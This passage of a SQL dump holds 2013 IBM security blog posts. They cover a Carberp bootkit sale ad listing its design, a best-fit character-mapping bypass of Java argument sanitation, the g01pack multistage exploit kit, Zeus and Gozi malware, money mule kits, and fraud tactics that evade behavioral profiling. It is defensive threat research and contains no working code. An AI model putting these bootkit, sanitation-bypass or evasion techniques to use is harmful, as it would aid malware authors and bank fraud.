maximum flexibility, Trusteer Rapport can quickly adapt to any change in the threat landscape and shut down cyber criminals’ window of opportunity. As it combats sophisticated financial malware, Trusteer Rapport represents a serious roadblock to malware-based fraud. We take great pride in the fact that criminal groups see us as a threat to their livelihood and are constantly trying to find ways around us. We also remain vigilant and keep enhancing our intelligence capabilities, product functionality and operational processes. A French researcher was able to find a scenario in which our Carberp protection mechanism didn’t kick in. While we believe this is a rare scenario, we activated another layer to protect against it. We would like to thank this   for his help and cooperation.', '\'Carberp\', \'Fraud\', \'Malware\'', 'https://securityintelligence.com/ibm-security-trusteer-rapport-effectively-resists-carberp-bypass-attempts/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (605, 'When Characters Turn Bad: String Sanitation Bypass via Best-Fit Mappings', 'Mark Yason', '2013-6-18', 'If you’re working on software that converts strings from one character set to another, such as when performing UNICODE to ANSI string conversions, you may have probably heard about  . One interesting aspect about best-fit mapping conversions is that they can be used to bypass string sanitation routines as there may be instances where a sanitization code will fail to sanitize certain characters which may become potentially dangerous if converted to another character set. Here’s a sample illustration: \n An example of such  , a bug in Oracle Java Web Start (JWS) which we reported and was   and which I will be discussing in this blog post. A best-fit mapping conversion occurs when a character cannot be represented in another character set. In such cases, a “best-fit” character which is usually how the character looks like in the target character set will be used to represent the original character instead. For example, the best-fit mapping for the UNICODE characters U+02BA (MODIFIER LETTER DOUBLE PRIME) and U+030E (COMBINING DOUBLE VERTICAL LINE ABOVE) in the Windows-1252 character set is the quotation mark character (0x22). As illustrated below, you’ll notice the similar appearance of the characters and their subtle differences: \n Let’s use CVE-2012-3342 as a concrete example of how best-fit mapping conversions can be leveraged to bypass a string sanitation routine. The   in the command line argument sanitation code of the Java Web Start Launcher (JWS launcher), javaws.exe. The argument sanitization code is used by the JWS launcher when sanitizing the arguments that it will pass to javaw.exe. Because the arguments that the JWS launcher passes to javaw.exe may contain attacker-controllable strings, the argument sanitation code is there to prevent arbitrary arguments from being passed to javaw.exe. The argument sanitation code in the JWS launcher (in JRE 7u6 and above) operates on wide character strings and one sanitation method used involves quoting the whole argument and escaping all quotation mark and backslash characters that are found in the string. Consider the following simplified command line in which an attacker attempts to inject three malicious arguments to javaw.exe via an attacker-controllable string (in red): Because of the sanitation process, the argument injection will be thwarted: However, consider if the attacker uses the UNICODE character U+02BA instead of the quotation mark character to perform the argument injection: Because the sanitation code specifically looks for the quotation mark (0x22) and the backslash (0x5C) character, the UNICODE character U+02BA will be untouched in the sanitation process: The above command line would not pose an issue if javaw.exe uses the wide character version of its command line, but unfortunately, javaw.exe uses the ANSI version (internally via  ) of its command line. Because best-fit mapping is used in the conversion of the command line, the following ANSI version of the command line is used by javaw.exe: Notice that instead of one argument, the conversion process resulted into four arguments, with the second, third and the fourth arguments being controlled by the attacker. If you are developing software that uses different character sets, remember to perform the string sanitation after the string conversion, not before. Additionally, when converting strings used in security-sensitive operations, use documented options which prevent the use of best-fit mappings. An example is passing the   flag to the   API. Taking advantage of best-fit mapping conversion is just one way for an attacker to bypass string sanitization routines, so always test and look at them with an attacker’s mindset by trying as many attack scenarios you can think of.', '\'IBM X-Force Research\', \'Java\', \'Technical & Product\', \'Vulnerability Analysis\'', 'https://securityintelligence.com/when-characters-turn-bad-string-sanitation-bypass-via-best-fit-mappings/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (606, 'Carberp Source Code for Sale — Free Bootkit Included!', 'Etay Maor', '2013-6-18', 'The always-lively Russian fraud forums offer amateur and professional hackers a wide variety of tools to assist them in their criminal activity. Authorized dealers offer malware modules, botnets, rootkits, stolen credentials and the like for very reasonable prices. Although commoditized malware variants (such as Zeus) are sold on a daily basis, it is rare to see the source code of known malware being offered for sale. The security team at IBM Trusteer recently identified a Russian forum member who is offering the Trojan’s Carberp source code for $50,000. The seller, who goes by the alias “=Sj=,” provides a highly detailed description of the new developments and capabilities of the malware. The seller also explicitly writes that the source code is sold in coordination with the Carberp author and that it will only be sold to a trustworthy member. This comment is of particular interest as members of different   forums are apparently also attempting to sell the source code at a significantly lower price. One assumption is that a breach of contract by a Carberp seller caused a buyer to take revenge and sell the source code. The highly elaborate ad provides a detailed overview of numerous functions, processes and modules incorporated into Carberp. One of them is the newly designed bootkit, which the seller claims will significantly improve the infection rate. According to the ad, it “enables you to load a specifically compiled driver from the moment the OS starts. … The driver receives commands before all other loaded drivers (including all drivers at boot-load) and can monitor them or affect the way they load. A digital signature of the driver is unnecessary.” This is in fact a Master Boot Record (MBR) rootkit. In addition to the advanced features offered, the seller details some functions described as “oldies but goodies,” such as: Trusteer analysts have witnessed past occurrences in which a private group acquired malware source code (Citadel), enhanced it, sold variants and offered help and support. With the current feature set this malware offers, it can easily be configured to conduct targeted attacks on a wide variety of businesses as well as for use in data theft and reconnaissance. It remains to be seen if this is an attempt to dilute the Carberp source code due to internal struggles within the Trojan or its buyer groups. Another possibility is that the source code will be acquired and enhanced to create a new malware product for sale to the  . Enables you to load specifically compiled drivers from the moment the OS starts. The driver is loaded prior to the initialization of the NT core — prior to the initialization of PatchGuard — and can patch any code that runs at core. The driver receives commands before all other loaded drivers (including all drivers at boot-load) and can monitor them or affect the way they load. A digital signature of the driver is unnecessary. All Windows OS are supported, starting from XP to Windows 8, inclusive. All architectures are supported, x86 and AMD64 (EM64T). The boot-loader works with all types of NTFS-partitions. The compiled project consists of three main parts: The IPL code is metamorphic, consisting of a certain amount of blocks, which are scrambled randomly with each project compilation. The IPL code is encrypted and is dynamically decrypted at runtime. This way, each IPL code, when fully complied, is different from its predecessor in a binary way. The driver is also encrypted when it is being written to disk and decrypted by the initial loader at startup. A small limitation to the driver size: In relation to the different technical specifics of the IPL, the driver cannot be more than 100 KB. The project is compiled through MS Visual Studio 2005 and MS Windows 7 WDK. The driver can contain the following additional components: Compiles only under x86 in the executable file BkGen.exe; creates the file VBR.com at run, which contains the metamorphic code of the initial loader. Generates a unique loader with every run. Compiles under x86 and AMD64 in static library (/lib). Contains functions needed for installing and initializing the loader. Imported via the installer and driver. See file bklib.h. for details. At compilation, seeks the loader file VBR.com and integrates itself to resources. Compiled only under x86 to the file BkSetup.exe. Compiles for X86 and X64 to the dynamic library SetupDll.dll. The library exports one function: ULONG BkInstall (BOOL bReboot). When it is called, the loader is installed to the system. In case of an error, the function returns a Win32 error code. Compiles under x86 and AMD64 as an NT driver (kloader.sys). It injects attached DLLs to desired processes. The DLL and processes lists are contained in the configuration file for the FJ utility. Compiles for x86 and AMD64, linked in the injector-driver (kloader.sys). Creates a virtual file system in an unmarked section of the system hard drive. In case an unmapped sector does not exist sufficiently, the last section of the disk is reduced in size for this purpose. The file system is a modified FAT16 system. The cluster size is equal to the physical disk size. The maximum supported volume of the virtual disk is ~32MB. The file names are 8.3, because long names are not supported. Catalogs are unsupported. The FS is completely encrypted (RC6). Compiled under x86 and AMD64 and linked to driver-injector (kloader.sys). Filters low-level requests to read/write disk sectors. Prohibits the change (write) of sectors containing the initial loader. Blocks changes by third parties and drivers to the FS sectors. When reading the sectors containing the virtual FS, it nullifies its contents, in turn masking the existence of a file system. Compiles only to x86 in the executable, FJ.exe. Used for joining injected DLLs to the driver file and for attaching the driver file to the installer. For details, see \\FJ\\ReadMe.txt.', '\'Carberp\', \'Carberp source code\', \'Citadel Malware\', \'Fraud\', \'Malware\', \'Zeus Malware\'', 'https://securityintelligence.com/carberp-source-code-sale-free-bootkit-included/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (607, 'Attention Job Seekers: Zeus Is Recruiting Mules', 'Etay Maor', '2013-6-12', 'Employment websites have long been a target for cyber criminals. These websites are targeted by malware for credentials theft and are used for mule recruitment and malware distribution. A recent   configuration analyzed by IBM’s security team uses HTML injection to advertise a mule recruitment site when a victim visits CareerBuilder.com. It will likely affect thousands of job seekers.  are a critical component for criminals looking to cash out money from a victim’s account. In the past, criminals used many employment websites to recruit mules, advertising a job opening at a company looking for “financial managers.” The ads included enticing descriptions of easy money from simple “work-at-home” jobs, luring job seekers to contact the supposed employer and unknowingly serve as the money-laundering component of a cyber crime gang. Employment websites have recognized this threat to their job-seeking customers and are now offering easy ways for users to report suspicious ads. In addition, the affected websites created security teams that use a combination of manual and automatic search techniques to detect and remove suspicious ads. Malware authors, on the other hand, recognize that job seekers who actively access employment websites have a high potential to be recruited successfully and serve as money mules. So how would criminals continue to reach out to job seekers without raising the suspicion of the employment websites? A recent   malware configuration analyzed by IBM’s   team is using man-in-the-browser (MitB) techniques to present the user with an advertisement for a mule-recruitment site every time the victim accesses CareerBuilder.com. The mule recruitment website in this case is marketandtarget.com, as can be seen in the excerpt from the original Zeus configuration file below:\n \n \n The target website, marketandtarget.com, is currently down. \n \n When operational, the website had a typical mule recruitment site layout that included poorly written banners. \n The site also has a recruitment section that included, among other so-called opportunities, a “mystery shopper” job opening. (It is also worth noting that a website with a similar name, premiermarketsolutions.com, is a reported scam site.) By using CareerBuilder as a platform, the Zeus operators maximize their outreach to potential mule targets. While HTML injection is typically used for adding data fields or to present bogus messages, in this case we witnessed a rare usage that attempts to divert the victim to a fake job offering. Because this redirection occurs when the victim is actively pursuing a job, in this case with CareerBuilder, the victim is more likely to believe the redirection is to a legitimate job opportunity. Man-in-the-browser malware remains a significant threat to end users, whether it is used for data theft or for user redirection attempts.   can identify, prevent and remove Zeus and other   that employ this technique to minimize the risk of fraud attempts of different flavors.', '\'HTML Injection\', \'Man-in-the-Browser (MitB)\', \'Money Mules\', \'Zeus\'', 'https://securityintelligence.com/attention-job-seekers-zeus-is-recruiting-mules/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (608, 'Zeus Analysis – Memory Forensics via Volatility', 'Zubair Ashraf', '2013-5-28', 'I am planning to do a blog series on   using the Zeus sample that I recently received in an email. The idea is not only to share what it does, but to focus mostly on sufficient details (without boring the average reader to death) of how it does what it does, and techniques and tools an analyst can use during the analysis. We will be looking at it through various angles and tools. It is quite common for   to have several layers of encoding obfuscations and go through various steps of downloaders. Therefore, often a quick first stab at it is to let it run through a locally deployed automated dynamic analysis sandboxing solution such as   or use various freely available services such as  . (Caveat: hastily submitting a targetted attack sample to an online service is not a very good idea, as this can alert the attackers that they have been discovered, but this is not we are talking about today). Furthermore, there is a cat and mouse chase going with malware defeating or making it hard to do automatic analysis and reverse engineering, so in many cases it makes sense to just take a look at an infected system via memory forensics and see how   has established itself on our system, this way we can discover the various different aspects of malware and can work backwards and forewords on pieces that we are interested in further learning about. In this post we will take a look at what can we learn from an infected system, using Volatility and how can we extract the final piece of decrypted/decoded/unpacked malicious code for further analysis. So it begins with someone who spells her last name with a lower case letter sending me an email so I can review the export License and invoice: But there is a problem I (and most likely you too) don’t get paid to review licenses and invoices. So let’s not worry about the information in the attachment for humans but review what it has for our machines.\n We will use   a free available and very powerful tool for memory forensics.\n The first step is to acquire memory image, we will use the freely available VirtualBox to run a Windows XP VM, and using the technique described  , get a memory dump of the machine after running the attachment that contained an  . More specifically I used the technique mentioned in section  \n The first thing I would do is use psxview which enumerates processes using various techniques and is likely to detect processes hidden by rootkits as well.\n As we will see below that the process has already exited and is not resident in memory, as an example of using knowledge from memory forensics to identify interesting pieces and investigate further, if we wanted to get more information about this suspicious process we can go back to VM, reverting it to a clean snapshot, infecting again and looking at procmon logs or via logs from automated dynamic analysis solution. Let’s take a look at log from procmon.exe:', '\'Analysis\', \'Malware\', \'Malware Analysis\', \'Memory Forensics\', \'Sandboxing\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/zeus-analysis-memory-forensics-via-volatility/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (609, 'CVE-2013-1347: Microsoft Internet Explorer CGenericElement object Use-After-Free Vulnerability', 'Yong Chuan Koh', '2013-5-22', '', '\'Internet Explorer (IE)\', \'Microsoft\', \'Patch\', \'Vulnerabilities\'', 'https://securityintelligence.com/cve-2013-1347-microsoft-internet-explorer-cgenericelement-object-use-after-free-vulnerability/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (610, 'No Money Mule, No Problem: Recruitment Website Kits for Sale', 'Etay Maor', '2013-5-9', 'If “money makes the world go ’round” (according to “Cabaret”), then money mules make the fraud economy go ’round. A valuable asset in the world of  , money mules enable cyber criminals to cash out stolen money. After cyber criminals take over a victim’s account, they enlist the help of a third person — a mule — to retrieve the money and send it to them in an untraceable manner. Typically,   into receiving money from a victim’s account and transferring the money to the criminal using a payment service, such as Western Union or MoneyGram. To do so, fraudsters set up fake company websites that they use to recruit “financial managers” to manage the firm’s funds. The financial manager’s “job” is to receive payments from the company’s clients and then forward the payments (save a 2 to 10 percent commission) to company managers via a payment service. This tactic is the first lesson in Money Laundering 101. Bogus websites that are used as fronts for recruiting money mules have been around for many years. The security team at IBM recently identified a Russian forum member who took the liberty of perfecting this scam and is now offering a universal money mule recruitment site kit. The forum member offers a complete mule recruitment template package, including a back-end administration system, website template, spam e-mail templates, mule correspondence templates and more. The entire package is preconfigured for a fake brokerage company that is searching for “talented people to join our team of professionals.” IBM’s investigation uncovered a map of the company’s headquarters, which is conveniently located in the Moscow University campus. The e-mail correspondence templates (titled “templates for drops”) include a number of scenarios in which the criminal needs to contact the money mule. Here are some examples: Some of the templates include requests for additional data or access to the mule’s bank account: This package offers a comprehensive solution for those engaged in  , covering every aspect from mule recruitment to cashing out. This offering demonstrates, once again, that mules are critical players in the fraud ecosystem. Similar to the cases of the   and the  , analysts are witnessing offers in the cyber underground that provide potential buyers with flexibility and scalability. Consumers must be made aware of these types of scams, as well as the perils of “work from home” offers that involve money transfers and questionable incoming transactions. As a rule of thumb, any doubt is enough doubt. Online offers that seem even mildly suspicious are probably illegal.', '\'Bank Fraud\', \'Western Union\'', 'https://securityintelligence.com/money-mule-problem-recruitment-website-kits-sale/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (611, 'Multistage Exploit Kits Boost Effective Malware Delivery', 'Amit Klein', '2013-5-2', 'Most drive-by exploit kits use a minimal exploit shellcode that downloads and runs the final payload. This is akin to a two-stage intercontinental ballistic missile (ICBM), where the first stage — the exploit — puts the rocket in its trajectory, and the second stage — the payload — inflicts the damage. In the cyber crime world, the decoupling of the first stage from the payload is designed to ensure that exploit kits are as generic as possible and can deliver all possible payloads, provided that the payloads only need native execution, either as a stand-alone executable — files with a .exe file extension — or DLL registration via RegSvr32 — files with a .dll extension. The IBM research team recently found that a Java exploit kit called g01pack has added another mid-course stage, turning the infection process into a multistage attack. The first stage of the attack, the exploit shellcode, executes a second stage in which a Java class runs in a separate Java process. This second Java process then downloads and runs the final payload. We believe this discovery represents the first instance of an exploit kit delivering its payload via a multistage attack. Why would an attacker need a multistage exploit? To extend the ICBM analogy, in much the same way that an ICBM uses multiple stages to obtain a longer range, the attacker uses multiple stages to distance the attack launch site from its final destination. By utilizing an extra stage, the attack is more likely to bypass some security products; the initially exploited process (Java) launches another Java process (the second stage) that appears less suspicious, and only that second-stage process runs the final, native payload (the persistent malware dropper). This is supported by the analysis we performed using various   and the poor detection rate we observed. Out of 46 tools tested in file-scanning mode, only eight tools identified the first-stage JAR as malicious, and only two identified the second-stage class (cabOrgies.class) as malicious. We observed this multistage exploit approach in one of the vulnerabilities exploited by the g01pack exploit kit: the well-known Java vulnerability CVE-2012-1723, which dates back to mid-2012. This vulnerability allows the exploit to break out of the Java sandbox. It has long since been patched by Oracle, but apparently, there are enough unpatched targets to make this attack worthwhile. Although the Java exploit we researched is part of the g01pack exploit kit, it is interesting to note that some implementation details are similar to the exploit used by BlackHole for CVE-2012-1723, identified in mid-2012 (as described in a  ). The BlackHole approach, however, was a typical exploit payload scheme, not the exploit-intermediate process-payload scheme we see here. The final payload is, of course, malware. We noticed many malware families being distributed by this specific exploit kit, such as Zeus, Torpig, Gozi, Shylock and likely many others. The exploit kit is used to infect targets globally, with an infection rate estimated at 1 in 3,000 machines per month infected by payload executions from this exploit kit alone as of mid-2013. This very high infection rate proves the effectiveness of this multistage approach. Therefore, it is highly likely that other exploit kits will incorporate a similar approach. Stage 1 begins when the browser navigates to a Web page that contains HTML code and an Applet tag. When the browser renders the content of the Web page, the Applet tag instructs the browser to launch a Java class from a URL designated in the Applet tag using arguments given in the Applet tag. These arguments contain the encrypted URL of the final payload — this can be a Windows executable (parameter name is “date”) or a Windows DLL file (parameter name is “guid”). For example, the Applet tag would be: This instructs the browser to launch Java (the “javaw.exe” process) with the JAR URL (in our example, the “[ ].jar” is located in the same host and folder originally accessed by the browser), the class name (package “critical,” class “securityupdate”) and the parameters (in our case, “date,” whose value is a long encrypted string that represents the URL of the final payload). Java then retrieves the JAR URL and invokes the Applet class from the package. The malicious JAR file implements a Java package called “critical,” and contains six Java classes (.class files): Java starts by running the init() method of the Applet class “securityupdate.” This function first ensures that it is running on a Windows platform and that the JRE version is not “1.7” (i.e., it ensures it does not run on Java 7; in fact, the exploit will succeed only for Java versions 6u10-6u32 inclusive). Next, the function uses the Java class “entry” to exploit   and escape out of the Java sandbox. A patch for this vulnerability is available, but apparently, there are still enough unpatched Java 6 installations to make it a valuable target for exploit kit writers. A successful exploitation results in running the method “JiXU” of class “keaVestAltho” with high privileges. This method contains a hard-coded encrypted string, which represents the “in memory” class “remoterEhPoplin.” The method decrypts the string, creates the class from it and invokes the class constructor with three arguments: the Applet’s “date” parameter, the Applet’s “guid” parameter and a byte array representing the second-stage class “cabOrgies,” which the method copied into memory from the corresponding JAR resource. The constructor for class “remoterEhPoplin,” the “in memory” class, has the following flow: As you can see, in steps 5 and 6, the Java process launches another new Java process with a copy of the second-stage class. Note that the “date” and “guid” parameters of the Applet tag (which contain the payload URL in an encrypted form) are transferred as-is in the Java invocation command line. The EXE/DLL indicator becomes the third parameter (set to “0” for EXE or “1” for DLL). For the example above, the following command will be executed: This launches Java (javaw.exe) in a new, minimized window with an empty title. A new Java process is launched with the working directory set to %TEMP%. This directory includes a package (folder) called “critical,” which includes a class file called “cabOrgies.” The Java process is launched with four command line arguments: “critical/cabOrgies,” “main” (ignored), the encrypted URL and an EXE/DLL indicator. This instructs Java to invoke the main method of the class cabOrgies found in %TEMP%\\critical/cabOrgies.class with a string array containing the following three command line arguments: “main,” the encrypted URL and the EXE/DLL indicator. It follows this workflow: As you can see, Step 3.g runs the final payload. In our example, the encrypted URL string is decrypted into: The host name no longer has a DNS resolution, however, which is hardly surprising. The Java code in both stages is heavily obfuscated. Four different obfuscation methods are applied (some of them probably via an obfuscation tool): The obfuscation instances change rapidly, and it’s quite common to see two to three different versions in a single day — so, we don’t expect to see “cabOrgies” a few days from now. Some names take longer to change. For example, the package name used to be called “oracle” in early April, and for the past few weeks, it has been called “critical.” The g01pack is among the most successful exploit kits available today. It executes a drive-by download attack that results in the silent installation of malware. Using the multistage attack, the g01pack exploit kit can effectively distribute advance malware that evades detection by existing security controls. I’d like to thank Assaf Friedman from the IBM Trusteer security group for his help collecting the data for this blog.', '\'Drive-by Download\', \'Exploit\', \'Exploit Kit (EK)\', \'Gozi\', \'HTML\', \'Java\', \'Oracle\', \'Sandbox\', \'Security Tools\', \'Shellcode\', \'Shylock\', \'Zeus\'', 'https://securityintelligence.com/multistage-exploit-kits-boost-effective-malware-delivery/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (612, 'Twitter Malware: Spreading More Than Just Ideas', 'Dana Tamir', '2013-4-22', 'News, blogs, opinions — Twitter is one of the most popular social networks for spreading ideas. It has revolutionized the way millions of people consume news. With 288 million active users, Twitter is the world’s fourth-largest social network, so it’s no surprise that   are on the rise. IBM’s Tanya Shafir has recently identified an active configuration of financial malware targeting Twitter users. The malware launches a Man in the Browser (MitB) attack through the browser of infected PCs, gaining access to the victim’s Twitter account to create malicious tweets. The malware, which has been used to gain access to   and target their financial transactions, now has a new goal: to spread malware using the online social networking service. At this time, the attack is targeting the Dutch market. But because Twitter is used by millions around the world, this type of attack can be used to target any market and any industry. The attack is carried out by injecting Javascript code into the victim’s Twitter account page. The malware collects the user’s authentication token, which enables it to make authorized calls to Twitter’s APIs, and then posts new, malicious tweets on behalf of the victim. Here is an excerpt from the injected Javascript code: Here are some examples of the tweets posted by the malware from victims’ accounts (tweets containing explicit content were omitted from this blog post): The tweets include the following malicious links (all appear to be inactive at the moment): IBM researchers found these texts in multiple Twitter posts indicating that this attack has been successful at ensnaring victims. This attack is particularly difficult to defend against because it uses a new, sophisticated approach to spear phishing. Twitter users follow accounts that they trust. Because this Twitter malware creates malicious tweets and sends them through a compromised account of a trusted person or organization, followers assume the tweets are genuine. The fact that the tweets include shortened URLs is not concerning: Twitter limits the number of characters in a message, so followers expect to get interesting news bits in the form of a short text message and a shortened URL. However, a shortened URL can be used to disguise the underlying address so that followers have no way of knowing if the link is suspicious. While Trusteer did not inspect the URLs posted, it is quite possible that these URLs lead to malicious Web pages. If so, when the browser renders the Web page’s content, an exploit can silently download the malware to the user’s   (a drive-by download). This type of attack increases the need for enterprise exploit prevention technology. By blocking the exploitation of vulnerable endpoint user applications such as browsers and preventing the malware download, exploit prevention technology stops the attack and prevents the malware from spreading and infecting more users. External sources like Web content and email attachments, which can include a hidden exploit in the form of embedded code, should never be trusted. Such content should only be opened while monitoring the application state to ensure it is operating legitimately.', '\'Drive-by Download\', \'Exploit\', \'Java\', \'JavaScript\', \'Malware\', \'Man-in-the-Browser (MitB)\', \'Social Media\', \'Spear Phishing\', \'Twitter\'', 'https://securityintelligence.com/twitter-malware-spreading-more-than-just-ideas/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (613, 'Gozi Financial Malware Puts the Boots On', 'Etay Maor', '2013-4-18', 'Gozi is a   that was the focus of media attention over several months in late 2012 and early 2013. It infected more than 1 million computers around the world, causing tens of millions of dollars in damage. In late 2012, Gozi was part of a planned attack against U.S. banks, and recently, it was reported that the   was arrested and faces up to 95 years in prison if he is found guilty It seems that the capture of the alleged author was celebrated all too soon. Banks across the world — and specifically in the United States — have continued to experience Gozi-based fraud well into 2013. Not only that, but it’s actually getting worse. The research team for IBM Security Trusteer has identified a new Gozi variant that infects the Master Boot Record (MBR), ensuring it loads with the operating system after a reboot and remains on the infected system even if the operating system is reinstalled. Even though MBR rootkits are considered highly effective, they haven’t been integrated into a lot of financial malware. One exception was the Mebroot rootkit, which was used to deploy Torpig (aka Sinowal/Anserin). Due to their strategic placement in the operating system’s kernel, rootkits are difficult to identify and remove. Upon infection, Gozi lurks in the MBR, waiting for Internet Explorer (IE) to be launched. Once IE is detected, the malware injects itself into the process and runs inside the browser. It intercepts traffic and performs Web injections, like most financial Trojans do. In fact, the Gozi variant IBM research detected looks like an old variant that was not previously packaged with the rootkit that was used. This may indicate that a new rootkit is being sold in   and adopted by malware authors. Although some rootkits can be removed using dedicated tools, most experts recommend a complete hard drive format to ensure a clean start. Financial institutions should change infected user credentials only after a system format or after the malware functionality is disabled.  protects end users by preventing the malware code from injecting into the browser. However, to fully mitigate fraud risk, it is recommended that infected users do format the hard drive, reinstall the operating system, install Trusteer Rapport and receive new credentials to their online banking account.', '\'Financial Malware\', \'Gozi\', \'HTML Injection\', \'Internet Explorer (IE)\', \'Malware\'', 'https://securityintelligence.com/gozi-financial-malware-puts-the-boots-on/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (614, 'Behavioral Profiling: Finding the Man Who Wasn’t There', 'Etay Maor', '2013-4-17', 'In the movie “Identity,” Pruitt Taylor Vince’s character whispers a verse from the poem “Antigonish,” saying, “As I was going up the stairs, I met a man who wasn’t there. He wasn’t there again today. I wish, I wish he’d go away.” How do you detect and identify criminal behavior? How do cyber criminals masquerade their actions and make themselves invisible to  ? Some solutions claim the answer is behavioral profiling. The term “behavioral profiling” is most commonly associated with airport security and “CSI” episodes. This interpretation fits quite well with the Wikipedia definition: “Offender profiling, also known as criminal profiling, is a behavioral and investigative tool that is intended to help investigators to accurately predict and profile the characteristics of unknown criminal subjects or offenders. Offender profiling is also known as criminal profiling, criminal personality profiling, criminological profiling, behavioral profiling or criminal investigative analysis.” In recent years, behavioral profiling has emerged in the online security world, but is it really behavioral profiling per se? Sadly, the answer is no. Real behavioral profiling is focused on identifying a potential criminal, while computer behavioral profiling systems are focused on identifying normal user patterns. That’s quite a difference! Behavioral profiling in the online world is a tough task. The suspected   cannot be visually seen and/or analyzed for a long period, which is not the case in the physical world. This means that online behavioral profiling is based purely on a limited set of user actions collected by detection systems. That is why current detection systems have opted to analyze normal user behavior, define a normal user profile and then raise a red flag if an action outside of that “normal” profile occurs. This approach should sound familiar — it’s called white-listing. The problem with white-listing, however, is that cyber criminals are aware of its existence and have found clever ways to circumvent it. The following are just three examples of behavioral profile evasion techniques that have been successfully executed by cyber criminals: The first technique, which was the subject of a recent investigation by the innovation team at IBM, involves the use of stolen credentials in an unusual manner. Instead of logging in with the stolen credentials and committing a fraudulent transaction, the criminals access the compromised accounts multiple times but do not transfer any funds. What are they up to? This type of behavior clearly shows that cyber criminals are aware of behavioral profiling as well as device profiling systems. Since the criminals are using their own devices to fraudulently access an online bank account, they need to use a technique that does not trip any fraud detection wires. A new device that immediately adds a payee to an account or tries to send funds will undoubtedly be scrutinized. By accessing an account multiple times with the same device and only performing low-risk actions, the criminals are able to familiarize behavioral and device profiling systems with their device and actions. When a fraudulent transfer is ultimately initiated, the device and its behaviors are not identified as suspicious. While the above criminal tactic is performed via a new device, another evasion technique goes one step further and uses the victim’s actual device. However, the idea is the same: As long as the device is not flagged as suspicious, most fraudulent transactions will go unnoticed. Using malware with Remote Desktop Protocol (RDP)/Virtual Network Computing (VNC), the attacker mimics the account holder’s typical transaction amounts. These are easily viewed from a transaction history screen. This allows cyber criminals to commit fraud without raising any suspicion. It is nearly impossible to identify this type of fraud using behavioral and device profiling platforms. Malware developers have also come up with a clever plug-in that helps them learn a user’s normal behavior. Citadel, a popular financial Trojan, helps criminals capture video from a victim’s device in order to study a user’s behavior patterns, including transaction sums and clickstreams. The third technique also includes the presence of  ; however, this approach uses an automatic script to transfer funds to predefined mule accounts from the victim’s device. Financial malware is capable of injecting complete scripts into a user’s session without the victim noticing any change in browser behavior. These types of scripts run post-log-in and are configured to take over a session and initiate a fraudulent transaction. This eliminates the need to steal credentials and remotely access the victim’s account as well as the manual work involved in running RDP/VNC malware. Some behavioral profiling systems can identify these scripts by performing various tests on the activity performed on the transaction page. The most common test is to analyze how fast the transaction page was filled in. For example, humans cannot fill in all the transaction fields in less than a second, which is exactly what the script does. To appear more “human” and evade detection, fraudsters have now incorporated a “slow-fill” function in their malware. This function inserts a random pause between each character input that varies between 0.1 seconds to two seconds to make the behavior of the malware appear normal. To accurately and decisively detect these attack techniques, multiple security metrics must be collected, correlated and analyzed. These include the presence of malware and RDP access during   sessions, the evidence of stolen credentials, risk factors and account activity patterns. This holistic view is the only way to achieve true behavioral profiling and uncover “the man who wasn’t there.”', '\'Citadel Malware\', \'Credentials\', \'Cybercrime\', \'Cybercriminals\', \'Fraud\', \'Identity\', \'Identity and Access Management (IAM)\', \'Malware\', \'Remote Desktop Protocol (RDP)\', \'Trusteer\'', 'https://securityintelligence.com/behavioral-profiling-finding-man-wasnt/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (615, 'Use-after-frees: That pointer may be pointing to something bad', 'Mark Yason', '2013-4-1', 'If you look at the last few Internet Explorer security bulletins, you’ll notice that many of the patched vulnerabilities were use-after-frees (or UAFs) [1, 2]. Use-after-free is still a common bug class because the task of manually identifying them, especially in large and complex codebases is a challenge. The reason is that their existence is a result of the combined actions from different parts of an application – namely, the parts of the code that can cause the freeing of the object and the parts of the code that use the object. Therefore, inferring that a UAF condition may occur by looking at the code will not always be a straightforward task.  In this blog post, I’ll briefly explain UAFs, cite two UAF examples, and finally mention some runtime tools that can help you detect UAFs. \n Two common reasons that lead to dangling pointers are: \n The root cause in this particular example is an incorrect reference count of the   object which allowed the attack to prematurely free it while it is in-use. Interestingly, while looking at this zero-day vulnerability, I realized the possibility that there might be similar use-after-free scenarios (i.e. an event handler can trigger a free of currently in-use objects). So just to find similar potentially low-hanging bugs, via ad hoc manual fuzzing, I tried different combinations of JavaScript methods and JavaScript events.  After several unsuccessful attempts, I eventually stumbled across a similar UAF vulnerability which essentially was due to the   object being freed while currently in-use. The root cause of the bug was also due to an incorrect reference count of an object. We reported this vulnerability to Microsoft and it was patched last February 2013 [1]. In this particular case, a pointer to a  object was stored in the   object; however, the reference count of the   object was never updated. Additionally, when the   object was later removed from the DOM tree (via the   construct), its pointer in the   object was never updated. Afterwards, when the   object was garbage-collected, the   pointer stored in the   object became a dangling pointer. The use-after-free condition was then triggered when the dangling   pointer stored in the   object was dereferenced. Additionally, the location of access violations resulting from UAFs will probably be different from the location where the initial dereferencing of the dangling pointer occurred. This is because, unless the memory pointed to by the dangling pointer is released, the dereferencing of the dangling pointer will not trigger the access violation by itself; it is the use of the unexpected values obtained using (or written via) the dangling pointer which will potentially trigger the access violations. Fortunately, there are tools available [5] to detect different classes of memory corruption bugs including UAFs at runtime. Since I mostly look at closed-sourced Windows applications, the tool I mainly use is the page heap feature of Windows [6] which can be enabled using the GFlags tool [7] or the Application Verifier tool [8]. I usually enable full page heap verification for an application before analyzing a simplified version (minimum code/fields required to trigger the vulnerability) of an exploit. In the case of UAFs, if full page heap verification is enabled, the memory where the freed object was stored will become inaccessible since its page protection 